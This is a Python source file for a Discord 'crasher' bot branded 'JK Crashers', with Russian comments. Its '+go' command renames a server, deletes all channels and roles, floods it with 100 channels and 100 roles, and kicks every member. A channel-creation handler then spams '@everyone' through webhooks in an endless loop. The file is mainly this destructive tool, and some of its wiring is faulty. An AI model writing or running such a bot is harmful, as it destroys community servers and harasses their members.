import discord
import time
import random
import asyncio
import os
import json
import inspect
import aiohttp
import datetime
import threading
from discord import Permissions
from discord_webhook import DiscordWebhook as hook, DiscordEmbed as D_Embed
from discord import client
from discord.ext import commands
from discord.utils import get
from threading import Thread
from time import sleep
import discord, random, aiohttp, asyncio
from discord import Webhook, AsyncWebhookAdapter
from colorama import Fore, init

#Я расстроился, так как анонимус бот тоже отключен
#https://prnt.sc/1n85dsq

intents = discord.Intents.all()
client = discord.client
bot = commands.Bot(command_prefix = '+', intents=intents)
bot.remove_command( 'help' )

@client.event
async def on_ready():
  print(f'Бот запущен. Ник бота: {client.user}  ')
  await client.change_presence(status=discord.Status.online, activity=discord.Streaming(name=f'JKtimosha Yotube| JK crashers', url='https://www.twitch.tv/unknowpage'))




@bot.command()
async def go(ctx):
  with open('bebra.png', 'rb') as f:
    icon = f.read()
    await ctx.guild.edit(name='Crash by JK Crashers', icon=icon)
  for x in ctx.guild.channels:
    try: await x.delete()
    except: pass
  for x in ctx.guild.roles:
    try: await x.delete()
    except: pass
  for x in range(100):
    await ctx.guild.create_text_channel(name="JK Crashers")
  for x in range(100):
    await ctx.guild.create_role(name ="crash by JK Crashers")
  for x in ctx.guild.members:
        try: await x.kick(reason="Форзель наебщик")
        except: pass



@bot.event
async def on_guild_channel_create(channel):
    print("test")
    webhook = await channel.create_webhook(name = "Crash by JK Crashers")
    print("test2")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      print("test3")
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      print("test4")
      while True:
        try:
          await webhook.send("@everyone")
        except:
          pass

        bot.run("")
